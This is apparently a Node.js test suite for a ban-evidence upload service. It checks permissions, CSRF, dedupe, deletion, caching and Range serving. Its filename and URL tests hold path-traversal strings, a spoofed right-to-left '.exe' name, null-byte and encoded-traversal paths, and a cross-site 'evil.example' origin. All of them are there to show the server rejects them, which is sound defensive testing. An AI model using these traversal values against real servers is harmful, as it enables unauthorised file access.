  if (free < 2 * L) return t.skip('too little free disk here');
  // One upload declaring L fits with L/2 to spare; a second one does not.
  // The margins absorb ±50 MB of other disk activity during the test.
  const h = await harness(t, { maxMB: 100, minFreeBytes: free - 1.5 * L });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const q = new URLSearchParams({ targetType: 'ban', targetId: String(w.ban.id), filename: 'big.png' });
  const slow = http.request(`${h.base}/api/evidence?${q}`, {
    method: 'POST', headers: { origin: h.base, cookie: owner.cookie, 'content-length': String(L) },
  });
  slow.on('error', () => {});
  slow.write(Buffer.concat([PNG_HEAD, crypto.randomBytes(64 * 1024)]));
  await waitFor(() => h.temps().length === 1, 'the first upload under way');

  // Refused once sniffed: a 415 shows the space check let it through.
  const html = Buffer.from(`<html>${'x'.repeat(200)}`);
  const second = await owner.upload(w.ban, html, { declared: L, filename: 'b.png' });
  assert.strictEqual(second.status, 507, second.text);
  assert.match(second.json.error, /low on disk space/);

  slow.destroy();
  await waitFor(() => h.temps().length === 0, 'the first upload gone');
  const afterAbort = await owner.upload(w.ban, html, { declared: L, filename: 'c.png' });
  assert.strictEqual(afterAbort.status, 415, `an aborted upload frees its room: ${afterAbort.text}`);
  const afterRefusal = await owner.upload(w.ban, html, { declared: L, filename: 'd.png' });
  assert.strictEqual(afterRefusal.status, 415, `so does a refused one: ${afterRefusal.text}`);
  const stored = await owner.upload(w.ban, FIX.png(), { filename: 'small.png', chunked: true }); // reserves the cap
  assert.strictEqual(stored.status, 200, stored.text);
  const afterStored = await owner.upload(w.ban, html, { declared: L, filename: 'e.png' });
  assert.strictEqual(afterStored.status, 415, `and a stored one: ${afterStored.text}`);
  assert.deepStrictEqual(h.temps(), []);
  return undefined;
});

test('start() sweeps only stale temp files; stored and unknown files are never touched', async (t) => {
  const h = await harness(t);
  fs.mkdirSync(h.storeDir, { recursive: true });
  const old = path.join(h.storeDir, '.upload-0123456789abcdef01234567.tmp');
  const fresh = path.join(h.storeDir, '.upload-fedcba9876543210fedcba98.tmp');
  const stored = path.join(h.storeDir, `${'a'.repeat(64)}.png`);
  const other = path.join(h.storeDir, 'notes.txt');
  for (const f of [old, fresh, stored, other]) fs.writeFileSync(f, 'x');
  const twoHoursAgo = new Date(Date.now() - 2 * 3600 * 1000);
  fs.utimesSync(old, twoHoursAgo, twoHoursAgo);
  fs.utimesSync(stored, twoHoursAgo, twoHoursAgo); // old and unreferenced, still kept
  h.evidence.start();
  assert.deepStrictEqual(h.files(), [path.basename(fresh), path.basename(stored), 'notes.txt'].sort());
});

test('a temp file the OS holds is retried, then left to the periodic sweep, which also clears stale ones without a restart', async (t) => {
  const h = await harness(t, { maxMB: 1, sweepMs: 100 });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const realRm = fs.promises.rm;
  let refusals = 2;
  const isTemp = (p) => path.basename(String(p)).startsWith('.upload-');
  const rm = t.mock.method(fs.promises, 'rm', async (p, opts) => {
    if (isTemp(p) && refusals > 0) {
      refusals--;
      throw Object.assign(new Error('EBUSY: resource busy or locked, unlink'), { code: 'EBUSY' });
    }
    return realRm.call(fs.promises, p, opts);
  });
  const html = Buffer.from('<html><body>not evidence</body></html>');
  const busy = await owner.upload(w.ban, html, { filename: 'a.png' });
  assert.strictEqual(busy.status, 415, busy.text);
  assert.strictEqual(refusals, 0, 'refused twice, removed on the next try');
  assert.deepStrictEqual(h.temps(), [], 'before the answer');

  refusals = Infinity;
  const callsBefore = rm.mock.callCount();
  const held = await owner.upload(w.ban, html, { filename: 'b.png' });
  assert.strictEqual(held.status, 415, held.text);
  assert.strictEqual(rm.mock.callCount() - callsBefore, 4, 'one try and three retries');
  assert.ok(h.logs.some((l) => /temp file not removed, left to the sweep: EBUSY/.test(l)));
  await waitFor(() => h.temps().length === 0, 'the sweep removing the held file');

  // An upload cut off by a crash: swept once stale, with no restart.
  const stale = path.join(h.storeDir, '.upload-00112233445566778899aabb.tmp');
  const fresh = path.join(h.storeDir, '.upload-ffeeddccbbaa998877665544.tmp');
  for (const f of [stale, fresh]) fs.writeFileSync(f, 'x');
  const twoHoursAgo = new Date(Date.now() - 2 * 3600 * 1000);
  fs.utimesSync(stale, twoHoursAgo, twoHoursAgo);
  await waitFor(() => !fs.existsSync(stale), 'the stale temp file swept');
  await new Promise((r) => setTimeout(r, 300));
  assert.ok(fs.existsSync(fresh), 'a recent one is left alone');
  assert.strictEqual((await owner.upload(w.ban, FIX.png(), { filename: 'ok.png' })).status, 200, 'the store still works');
});

// ------------------------------------------------------ IN-PROCESS: perms

test('permissions per target: a warn-only role attaches to warn actions only; bad and missing targets are refused', async (t) => {
  const h = await harness(t);
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const broadcast = { type: 'action', id: h.auth.audit(owner.user.id, 'broadcast', { details: { message: 'hi' } }) };
  const warnOnly = h.as({ view: true, warn: true });
  const kickOnly = h.as({ view: true, kick: true });
  const auditOnly = h.as({ view: true, audit: true });
  const viewer = h.as('viewer');

  const up = (who, target) => who.upload(target, FIX.png(), { filename: 'p.png' });
  assert.strictEqual((await up(warnOnly, w.warnAction)).status, 200, 'warn action: ok');
  for (const target of [w.kickAction, w.banAction, w.ban]) {
    const r = await up(warnOnly, target);
    assert.strictEqual(r.status, 403, `${target.type} ${target.id}: ${r.text}`);
    assert.match(r.json.error, /needs the (kick|ban) permission/);
  }
  assert.strictEqual((await up(kickOnly, w.kickAction)).status, 200, 'kick action: ok');
  assert.strictEqual((await up(kickOnly, w.warnAction)).status, 403);
  assert.strictEqual((await up(owner, w.banAction)).status, 200, 'a ban action takes evidence too');
  assert.strictEqual((await up(auditOnly, w.warnAction)).status, 403, 'reading roles cannot upload');
  assert.strictEqual((await up(viewer, w.warnAction)).status, 403);

  const broadcastTry = await up(owner, broadcast);
  assert.strictEqual(broadcastTry.status, 400, broadcastTry.text);
  assert.match(broadcastTry.json.error, /warn, kick and ban actions only/);
  assert.strictEqual((await up(owner, { type: 'ban', id: 999999 })).status, 404);
  assert.strictEqual((await up(owner, { type: 'action', id: 999999 })).status, 404);
  for (const [type, id] of [['player', 1], ['', 1], ['ban', 'abc'], ['ban', 0], ['ban', -3], ['ban', 1e12]]) {
    const r = await owner.upload({ type, id }, FIX.png(), { filename: 'p.png' });
    assert.strictEqual(r.status, 400, `${type}/${id}: ${r.text}`);
  }
  const noOrigin = await owner.upload(w.ban, FIX.png(), { filename: 'p.png', origin: false });
  assert.strictEqual(noOrigin.status, 403, 'CSRF still applies to raw uploads');
  const crossSite = await owner.upload(w.ban, FIX.png(), { filename: 'p.png', headers: { origin: 'https://evil.example' } });
  assert.strictEqual(crossSite.status, 403);
  assert.strictEqual(h.rows().length, 3, 'only the three allowed uploads stored');
  assert.deepStrictEqual(h.temps(), []);

  // Readers: ban/kick/warn/audit may list and fetch; a plain viewer may not.
  const id = h.rows()[0].id;
  for (const [who, label, st] of [[warnOnly, 'warn', 200], [auditOnly, 'audit', 200], [viewer, 'viewer', 403]]) {
    assert.strictEqual((await who.get(`/api/evidence?targetType=action&targetId=${w.warnAction.id}`)).status, st, `${label} list`);
    assert.strictEqual((await who.file(`/api/evidence/${id}/file`)).status, st, `${label} file`);
  }
  for (const q of ['', '?targetType=ban', '?targetType=player&targetId=1', '?targetType=ban&targetId=x']) {
    assert.strictEqual((await owner.get(`/api/evidence${q}`)).status, 400, q);
  }
});

test('a permission lost while the bytes arrive is checked again before the file is kept', async (t) => {
  const h = await harness(t, { maxMB: 1 });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const role = h.auth.createRole('warners', { view: true, warn: true });
  const mod = h.auth.createUser('mod', 'password-123', role.id);
  const cookie = `sw_session=${h.auth.createSession(mod.id, {}).token}`;
  const q = new URLSearchParams({ targetType: 'action', targetId: String(w.warnAction.id), filename: 'slow.png' });
  const body = Buffer.concat([PNG_HEAD, crypto.randomBytes(200 * 1024)]);
  const answer = new Promise((resolve, reject) => {
    const req = http.request(`${h.base}/api/evidence?${q}`, {
      method: 'POST', headers: { origin: h.base, cookie, 'content-length': String(body.length) },
    }, (res) => {
      const parts = [];
      res.on('data', (c) => parts.push(c));
      res.on('end', () => resolve({ status: res.statusCode, text: Buffer.concat(parts).toString() }));
    });
    req.on('error', reject);
    req.write(body.subarray(0, 1000));
    waitFor(() => h.temps().length === 1, 'the upload under way').then(() => {
      h.auth.updateRole(role.id, { perms: { view: true } }); // warn revoked mid-upload
      req.end(body.subarray(1000));
    }, reject);
  });
  const r = await answer;
  assert.strictEqual(r.status, 403, r.text);
  assert.deepStrictEqual(h.files(), []);
  assert.deepStrictEqual(h.rows(), []);
});

// ------------------------------------------- IN-PROCESS: dedupe, delete, cap

test('dedupe: one file for many rows; the same bytes on the same item answer the existing row; concurrent uploads never corrupt', async (t) => {
  const h = await harness(t, { maxMB: 1 });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const banB = extraBan(h, w.pid);
  const bytes = FIX.gif();
  const sha = sha256(bytes);

  const a = await owner.upload(w.ban, bytes, { filename: 'first.gif', caption: 'one' });
  assert.strictEqual(a.status, 200, a.text);
  const b = await owner.upload(banB, bytes, { filename: 'second.gif' });
  assert.strictEqual(b.status, 200, b.text);
  assert.notStrictEqual(b.json.evidence.id, a.json.evidence.id, 'a row per item');
  assert.deepStrictEqual(h.files(), [`${sha}.gif`], 'one file on disk');
  const again = await owner.upload(w.ban, bytes, { filename: 'renamed.gif', caption: 'other' });
  assert.strictEqual(again.status, 200, again.text);
  assert.strictEqual(again.json.duplicate, true);
  assert.deepStrictEqual(again.json.evidence, a.json.evidence, 'the existing row, unchanged');
  assert.strictEqual(h.rows().length, 2);
  assert.strictEqual(h.audits('evidence-upload').length, 2, 'a duplicate changes nothing and audits nothing');

  // Eight identical uploads at once to one item, and to eight items.
  const burst = Buffer.concat([PNG_HEAD, crypto.randomBytes(300 * 1024)]);
  const same = await Promise.all(Array.from({ length: 8 }, () => owner.upload(banB, burst, { filename: 'burst.png', chunked: true })));
  for (const r of same) assert.strictEqual(r.status, 200, r.text);
  assert.strictEqual(new Set(same.map((r) => r.json.evidence.id)).size, 1, 'one row for one item');
  assert.strictEqual(same.filter((r) => r.json.duplicate).length, 7);
  const targets = Array.from({ length: 8 }, () => extraBan(h, w.pid));
  const spread = await Promise.all(targets.map((tg) => owner.upload(tg, burst, { filename: 'burst.png' })));
  for (const r of spread) assert.strictEqual(r.status, 200, r.text);
  assert.strictEqual(new Set(spread.map((r) => r.json.evidence.id)).size, 8);
  assert.deepStrictEqual(h.temps(), [], 'every temp file consumed');
  assert.deepStrictEqual(fs.readFileSync(path.join(h.storeDir, `${sha256(burst)}.png`)), burst, 'stored intact');
  const served = await owner.file(spread[3].json.evidence.url);
  assert.strictEqual(sha256(served.body), sha256(burst));
});

test('delete: soft, the file goes once no live row needs it; uploader or ban+settings only', async (t) => {
  const h = await harness(t, { maxMB: 1 });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const adminA = h.as('admin'); // ban, not settings
  const adminB = h.as('admin');
  const warnOnly = h.as({ view: true, warn: true });
  const banB = extraBan(h, w.pid);
  const bytes = FIX.webp();
  const file = path.join(h.storeDir, `${sha256(bytes)}.webp`);

  const a = (await adminA.upload(w.ban, bytes, { filename: 'a.webp' })).json.evidence;
  const b = (await owner.upload(banB, bytes, { filename: 'b.webp' })).json.evidence;
  const mine = (await warnOnly.upload(w.warnAction, FIX.png(), { filename: 'w.png' })).json.evidence;

  const denied = await adminB.post(`/api/evidence/${a.id}/delete`, {});
  assert.strictEqual(denied.status, 403, 'another admin without settings');
  assert.match(denied.json.error, /uploader/);
  assert.strictEqual((await warnOnly.post(`/api/evidence/${a.id}/delete`, {})).status, 403);
  assert.strictEqual((await h.as('viewer').post(`/api/evidence/${a.id}/delete`, {})).status, 403);
  assert.strictEqual((await warnOnly.post(`/api/evidence/${mine.id}/delete`, {})).status, 200, 'own upload');

  const del = await adminA.post(`/api/evidence/${a.id}/delete`, {});
  assert.strictEqual(del.status, 200, del.text);
  assert.deepStrictEqual(del.json, { ok: true });
  assert.ok(fs.existsSync(file), 'still referenced by the other ban');
  assert.strictEqual((await owner.file(a.url)).status, 404, 'a deleted row is not served');
  assert.strictEqual((await owner.file(b.url)).status, 200);
  assert.deepStrictEqual((await owner.get(`/api/evidence?targetType=ban&targetId=${w.ban.id}`)).json.rows, []);
  const row = h.db.prepare('SELECT * FROM evidence WHERE id = ?').get(a.id);
  assert.strictEqual(row.deleted_by, adminA.user.id);
  assert.ok(row.deleted_at > 0, 'soft: the row stays');

  assert.strictEqual((await owner.post(`/api/evidence/${b.id}/delete`, {})).status, 200, 'ban+settings deletes anyone\'s');
  assert.ok(!fs.existsSync(file), 'no live row left: the file is gone');
  assert.strictEqual((await owner.post(`/api/evidence/${b.id}/delete`, {})).status, 404, 'already deleted');
  assert.strictEqual((await owner.post('/api/evidence/999999/delete', {})).status, 404);

  const audits = h.audits('evidence-delete');
  assert.strictEqual(audits.length, 3);
  assert.deepStrictEqual(JSON.parse(audits[1].details), {
    evidenceId: a.id, targetType: 'ban', targetId: w.ban.id, filename: 'a.webp', sha256: sha256(bytes),
  });
  assert.strictEqual(audits[1].target_player_id, w.pid);

  const back = await owner.upload(w.ban, bytes, { filename: 'again.webp' });
  assert.strictEqual(back.status, 200, 'the same bytes can be attached again');
  assert.ok(fs.existsSync(file));
});

test('at most 20 live files per item; a delete frees a slot', async (t) => {
  const h = await harness(t);
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const ids = [];
  for (let i = 0; i < 20; i++) {
    const r = await owner.upload(w.kickAction, Buffer.from(`note ${i}\n`), { filename: `n${i}.txt` });
    assert.strictEqual(r.status, 200, r.text);
    ids.push(r.json.evidence.id);
  }
  const full = await owner.upload(w.kickAction, Buffer.from('one more\n'), { filename: 'x.txt' });
  assert.strictEqual(full.status, 409, full.text);
  assert.match(full.json.error, /at most 20/);
  assert.deepStrictEqual(h.temps(), []);
  assert.strictEqual((await owner.upload(w.ban, Buffer.from('elsewhere\n'), { filename: 'x.txt' })).status, 200,
    'the cap is per item');
  assert.strictEqual((await owner.post(`/api/evidence/${ids[0]}/delete`, {})).status, 200);
  assert.strictEqual((await owner.upload(w.kickAction, Buffer.from('one more\n'), { filename: 'x.txt' })).status, 200);
});

// ------------------------------------------------------- IN-PROCESS: serving

test('serving: sniffed type, nosniff, the sandbox CSP, inline only for images and video, RFC 5987 names, private cache, ETag', async (t) => {
  const h = await harness(t, { maxMB: 1 });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const png = FIX.png();
  const up = await owner.upload(w.ban, png, { filename: 'screen shot ü"x.png', caption: '  TK at\n0:32  ' });
  assert.strictEqual(up.status, 200, up.text);
  assert.strictEqual(up.json.evidence.filename, 'screen shot ü_x.png');
  assert.strictEqual(up.json.evidence.caption, 'TK at 0:32', 'caption on one line');

  const f = await owner.file(up.json.evidence.url);
  assert.strictEqual(f.status, 200);
  assert.deepStrictEqual(f.body, png);
  const hd = (k) => f.headers.get(k);
  assert.strictEqual(hd('content-type'), 'image/png');
  assert.strictEqual(hd('x-content-type-options'), 'nosniff');
  assert.strictEqual(hd('content-security-policy'), FILE_CSP);
  assert.strictEqual(hd('cache-control'), 'private, max-age=3600');
  assert.strictEqual(hd('content-disposition'), 'inline; filename="screen shot __x.png"; filename*=UTF-8\'\'screen%20shot%20%C3%BC_x.png');
  assert.strictEqual(hd('cross-origin-resource-policy'), 'same-origin');
  assert.strictEqual(hd('accept-ranges'), 'bytes');
  assert.strictEqual(hd('content-length'), String(png.length));
  assert.strictEqual(hd('etag'), `"${sha256(png)}"`);

  const cached = await owner.file(up.json.evidence.url, { 'if-none-match': `W/"x", "${sha256(png)}"` });
  assert.strictEqual(cached.status, 304);
  assert.strictEqual(cached.body.length, 0);

  const kinds = [
    ['pdf', 'r.pdf', 'application/pdf', 'attachment'],
    ['txt', 'chat.txt', 'text/plain; charset=utf-8', 'attachment'],
    ['webm', 'c.webm', 'video/webm', 'inline'],
  ];
  for (const [kind, name, ctype, disp] of kinds) {
    const bytes = FIX[kind]();
    const r = await owner.upload(w.ban, bytes, { filename: name });
    assert.strictEqual(r.status, 200, r.text);
    const got = await owner.file(r.json.evidence.url);
    assert.strictEqual(got.headers.get('content-type'), ctype, kind);
    assert.ok(got.headers.get('content-disposition').startsWith(`${disp}; filename="${name}"`), kind);
    assert.strictEqual(got.headers.get('content-security-policy'), FILE_CSP);
    assert.deepStrictEqual(got.body, bytes);
  }
});

test('Range: one range for video seeking; past the end is a 416; several or malformed ranges are served whole', async (t) => {
  const h = await harness(t, { maxMB: 1 });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const mp4 = FIX.mp4();
  const size = mp4.length;
  const up = await owner.upload(w.ban, mp4, { filename: 'clip.mp4' });
  const url = up.json.evidence.url;
  const etag = `"${sha256(mp4)}"`;

  const part = async (range, extra = {}) => owner.file(url, Object.assign({ range }, extra));
  let r = await part('bytes=0-99');
  assert.strictEqual(r.status, 206);
  assert.strictEqual(r.headers.get('content-range'), `bytes 0-99/${size}`);
  assert.strictEqual(r.headers.get('content-length'), '100');
  assert.strictEqual(r.headers.get('content-type'), 'video/mp4');
  assert.deepStrictEqual(r.body, mp4.subarray(0, 100));
  r = await part(`bytes=${size - 120}-`);
  assert.strictEqual(r.status, 206);
  assert.deepStrictEqual(r.body, mp4.subarray(size - 120));
  r = await part('bytes=-20');
  assert.strictEqual(r.headers.get('content-range'), `bytes ${size - 20}-${size - 1}/${size}`);
  assert.deepStrictEqual(r.body, mp4.subarray(size - 20));
  r = await part(`bytes=${size - 5}-999999999`);
  assert.strictEqual(r.headers.get('content-range'), `bytes ${size - 5}-${size - 1}/${size}`, 'end clamped');

  for (const bad of [`bytes=${size}-`, `bytes=${size + 10}-${size + 20}`, 'bytes=-0']) {
    r = await part(bad);
    assert.strictEqual(r.status, 416, bad);
    assert.strictEqual(r.headers.get('content-range'), `bytes */${size}`);
  }
  for (const whole of ['bytes=0-1,4-5', 'bytes=0-1, -2', 'bytes=abc', 'bytes=9-3', 'items=0-5', 'bytes=0-99999999999999999999']) {
    r = await part(whole);
    assert.strictEqual(r.status, 200, whole);
    assert.strictEqual(r.headers.get('content-range'), null);
    assert.deepStrictEqual(r.body, mp4, whole);
  }
  r = await part('bytes=0-9', { 'if-range': '"stale"' });
  assert.strictEqual(r.status, 200, 'If-Range mismatch: the whole file');
  r = await part('bytes=0-9', { 'if-range': etag });
  assert.strictEqual(r.status, 206);
  assert.deepStrictEqual(r.body, mp4.subarray(0, 10));
});

// Node 26 kills the process when it collects a FileHandle left open, so a
// browser that cancels a video request while the server is still preparing
// the answer must not leave one behind.
test('a request abandoned before the file streams closes its file handle; the server keeps serving', async (t) => {
  const h = await harness(t, { maxMB: 1 });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const mp4 = FIX.mp4();
  const url = (await owner.upload(w.ban, mp4, { filename: 'clip.mp4' })).json.evidence.url;

  for (const range of [null, 'bytes=100-']) {
    const handles = [];
    let release;
    const gate = new Promise((r) => { release = r; });
    const realOpen = fs.promises.open;
    const mock = t.mock.method(fs.promises, 'open', async (...args) => {
      const fh = await realOpen.apply(fs.promises, args);
      handles.push(fh);
      const realStat = fh.stat.bind(fh);
      fh.stat = async (...a) => { await gate; return realStat(...a); };
      return fh;
    });

    const req = http.request(h.base + url, { headers: Object.assign({ cookie: owner.cookie }, range ? { range } : {}) });
    req.on('error', () => {});
    req.end();
    await waitFor(() => handles.length === 1, 'the server to open the file');
    req.destroy();
    await new Promise((r) => setTimeout(r, 100)); // the server sees the socket close
    release();
    await waitFor(() => handles[0].fd === -1, `the file handle to close (range ${range})`);
    mock.mock.restore();
  }

  const again = await owner.file(url);
  assert.strictEqual(again.status, 200, 'still serving');
  assert.deepStrictEqual(again.body, mp4);
});

test('filenames from the client are metadata only; no id or stored name reaches outside the store', async (t) => {
  const h = await harness(t, { maxMB: 1 });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const cases = [
    ['../../package.json', Buffer.from('a\n'), 'package.json.txt'],
    ['..\\..\\server\\index.js', Buffer.from('b\n'), 'index.js.txt'],
    ['evil.html', Buffer.from('c\n'), 'evil.html.txt'],
    ['photo.png', FIX.jpg(), 'photo.png.jpg'],
    ['\u202Egnp.exe', FIX.png(), 'gnp.exe.png'],
    ['CON.png', FIX.png(), '_CON.png'],
    [null, FIX.png(), 'evidence.png'],
  ];
  for (const [name, bytes, want] of cases) {
    const r = await owner.upload(w.ban, bytes, { filename: name });
    assert.strictEqual(r.status, 200, `${name}: ${r.text}`);
    assert.strictEqual(r.json.evidence.filename, want, String(name));
  }
  const long = await owner.upload(w.ban, FIX.png(), { filename: `${'a'.repeat(300)}.png` });
  assert.strictEqual(long.json.evidence.filename.length, 120);
  assert.ok(h.files().every((f) => /^[0-9a-f]{64}\.[a-z0-9]+$/.test(f)), 'stored names come from content only');
  assert.ok(!fs.existsSync(path.join(path.dirname(h.storeDir), 'package.json')));

  const id = h.rows()[0].id;
  for (const p of [
    '/api/evidence/..%2f..%2fpackage.json/file', '/api/evidence/../../package.json/file',
    `/api/evidence/${id}%00/file`, '/api/evidence/-1/file', `/api/evidence/${id}.png/file`,
  ]) {
    const r = await getRaw(h.base, p, owner.cookie);
    assert.ok(r.status === 404 || r.status === 400, `${p} -> ${r.status}`);
    assert.ok(!r.body.toString().includes('"name"'), 'no file content leaked');
  }
  assert.strictEqual((await getRaw(h.base, '/api/evidence/0/file', owner.cookie)).status, 400);
  assert.strictEqual((await getRaw(h.base, '/api/evidence/99999999999/file', owner.cookie)).status, 400);

  // A tampered row is never followed off the store, nor to another row's file.
  const [r1, r2] = h.rows();
  h.db.prepare('UPDATE evidence SET stored_name = ? WHERE id = ?').run('../../package.json', r1.id);
  h.db.prepare('UPDATE evidence SET stored_name = ? WHERE id = ?').run(r1.stored_name, r2.id);
  for (const row of [r1, r2]) {
    const r = await owner.file(`/api/evidence/${row.id}/file`);
    assert.strictEqual(r.status, 404, `row ${row.id}`);
  }
  assert.ok(h.logs.some((l) => /unusable stored name/.test(l)));
  const third = h.rows()[2];
  fs.rmSync(path.join(h.storeDir, third.stored_name));
  const missing = await owner.file(`/api/evidence/${third.id}/file`);
  assert.strictEqual(missing.status, 404, 'a file gone from disk');
  assert.match(missing.body.toString(), /evidence file missing/);
});

test('caption: optional, one line, at most 300 characters', async (t) => {
  const h = await harness(t);
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const ok = await owner.upload(w.ban, FIX.png(), { filename: 'p.png', caption: `${'é'.repeat(300)}` });
  assert.strictEqual(ok.status, 200, ok.text);
  assert.strictEqual(ok.json.evidence.caption, 'é'.repeat(300));
  const blank = await owner.upload(w.ban, FIX.png(), { filename: 'p.png', caption: ' \u200b ' });
  assert.strictEqual(blank.json.evidence.caption, null);
  const long = await owner.upload(w.ban, FIX.png(), { filename: 'p.png', caption: 'x'.repeat(301) });
  assert.strictEqual(long.status, 400, long.text);
  assert.match(long.json.error, /caption/);
  assert.strictEqual(h.rows().length, 2);
  assert.deepStrictEqual(h.temps(), []);
});

// ----------------------------------------------------------- IN-PROCESS: note

test('ban note: ban permission, control characters stripped, at most 2000, private, audited without its text', async (t) => {
  const h = await harness(t);
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const admin = h.as('admin');
  const warnOnly = h.as({ view: true, warn: true });
  const viewer = h.as('viewer');
  const url = `/api/bans/${w.ban.id}/note`;
  const stored = () => h.db.prepare('SELECT note FROM bans WHERE id = ?').get(w.ban.id).note;
  assert.strictEqual(stored(), 'clip on medal', 'set at ban time');

  const r = await admin.post(url, { note: ' Clip: https://medal.tv/x\n\u0007second\u0000 line\t ' });
  assert.strictEqual(r.status, 200, r.text);
  assert.deepStrictEqual(r.json, { ok: true, note: 'Clip: https://medal.tv/x\nsecond line' });
  assert.strictEqual(stored(), 'Clip: https://medal.tv/x\nsecond line');

  assert.strictEqual((await warnOnly.post(url, { note: 'x' })).status, 403);
  assert.strictEqual((await viewer.post(url, { note: 'x' })).status, 403);
  for (const body of [{}, { note: 42 }, { note: { a: 1 } }, { note: ['x'] }, { note: 'y'.repeat(2001) }]) {
    const bad = await admin.post(url, body);
    assert.strictEqual(bad.status, 400, `${JSON.stringify(body).slice(0, 40)} -> ${bad.text}`);
  }
  assert.strictEqual((await admin.post(url, { note: 'z'.repeat(2000) })).status, 200, '2000 fits');
  assert.strictEqual((await admin.post('/api/bans/999999/note', { note: 'x' })).status, 404);
  assert.strictEqual(stored(), 'z'.repeat(2000));

  // Private: only ban holders see it; Bans.cfg never carries it.
  const asAdmin = (await admin.get('/api/bans')).json.rows.find((b) => b.id === w.ban.id);
  assert.strictEqual(asAdmin.note, 'z'.repeat(2000));
  const asViewer = (await viewer.get('/api/bans')).json.rows.find((b) => b.id === w.ban.id);
  assert.ok(!('note' in asViewer), 'viewers never get the note');
  const cfg = await admin.get('/api/export/bans.cfg');
  assert.ok(!cfg.text.includes('zzz'), 'not in Bans.cfg');

  const cleared = await admin.post(url, { note: null });
  assert.deepStrictEqual(cleared.json, { ok: true, note: null });
  assert.strictEqual(stored(), null);
  assert.strictEqual((await admin.post(url, { note: '  ' })).json.note, null);

  // An imported ban mirrors BattleMetrics: its note is edited there.
  const bm = h.db.prepare(
    "INSERT INTO bans(steam_id, reason, note, active, source, external_id) VALUES(?, 'Cheating', 'bm note', 1, 'battlemetrics', '77')"
  ).run('76561198000000077').lastInsertRowid;
  const refused = await admin.post(`/api/bans/${bm}/note`, { note: 'local edit' });
  assert.strictEqual(refused.status, 409, refused.text);
  assert.match(refused.json.error, /BattleMetrics/);
  assert.strictEqual(h.db.prepare('SELECT note FROM bans WHERE id = ?').get(bm).note, 'bm note');

  const audits = h.audits('ban-note-update');
  assert.strictEqual(audits.length, 4);
  assert.strictEqual(audits[0].user_id, admin.user.id);
  assert.strictEqual(audits[0].target_player_id, w.pid);
  assert.deepStrictEqual(JSON.parse(audits[0].details), { banId: w.ban.id, length: 'Clip: https://medal.tv/x\nsecond line'.length });
  for (const a of audits) assert.ok(!/medal|zzz/.test(a.details), 'the note text never reaches the audit log');
});

// ------------------------------------------------- IN-PROCESS: Discord posts

test('evidence uploads and deletes post nothing to Discord', async (t) => {
  const h = await harness(t, { webhook: true });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const before = h.posts.length;
  assert.ok(h.posts.some((p) => p.embeds[0].title === 'Player banned'), 'the webhook is live');
  const up = await owner.upload(w.ban, FIX.png(), { filename: 'p.png' });
  assert.strictEqual(up.status, 200, up.text);
  assert.strictEqual((await owner.post(`/api/evidence/${up.json.evidence.id}/delete`, {})).status, 200);
  assert.deepStrictEqual(h.posts.slice(before), []);
});

test('a ban note edit posts nothing to Discord', async (t) => {
  const h = await harness(t, { webhook: true });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const before = h.posts.length;
  assert.strictEqual((await owner.post(`/api/bans/${w.ban.id}/note`, { note: 'clip' })).status, 200);
  assert.deepStrictEqual(h.posts.slice(before).map((p) => p.embeds[0].title), []);
});
